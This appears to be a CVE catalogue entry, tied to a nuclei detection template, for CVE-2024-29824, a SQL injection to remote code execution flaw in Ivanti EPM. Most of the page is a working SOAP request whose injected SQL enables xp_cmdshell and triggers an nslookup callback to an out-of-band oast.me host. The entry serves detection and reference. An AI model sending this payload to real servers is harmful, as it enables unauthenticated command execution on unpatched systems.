_cves/cve-2024-29824.md

---
layout: "post"
cve_id: "CVE-2024-29824"
title: "Ivanti EPM - Remote Code Execution"
pcap: true
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-29824.yaml"
author: "DhiyaneshDK"
severity: "critical"
reference: ['https://github.com/horizon3ai/CVE-2024-29824', 'https://nvd.nist.gov/vuln/detail/CVE-2024-29824', 'https://forums.ivanti.com/s/article/Security-Advisory-May-2024', 'https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/']
classification:
  cvss-metrics: "CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
  cvss-score: "9.6"
  cve-id: "CVE-2024-29824"
  epss-score: "0.94089"
  epss-percentile: "0.99897"
metadata:
  max-request: "1"
tags: ['cve', 'cve2024', 'ivanti', 'epm', 'sqli', 'rce', 'kev', 'vkev', 'vuln']
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
An unspecified SQL Injection vulnerability in Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code.


## 🌐 HTTP Request
<pre style="background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto;">
POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Length: 773
Content-Type: application/soap+xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UpdateStatusEvents xmlns="http://tempuri.org/">
      <deviceID>string</deviceID>
      <actions>
        <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
          <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup d4nu64ple0o2rc1c7tbgy6w1wan5wkmka.oast.me'--</status>
        </Action>
      </actions>
    </UpdateStatusEvents>
  </soap12:Body>
</soap12:Envelope>
</pre>
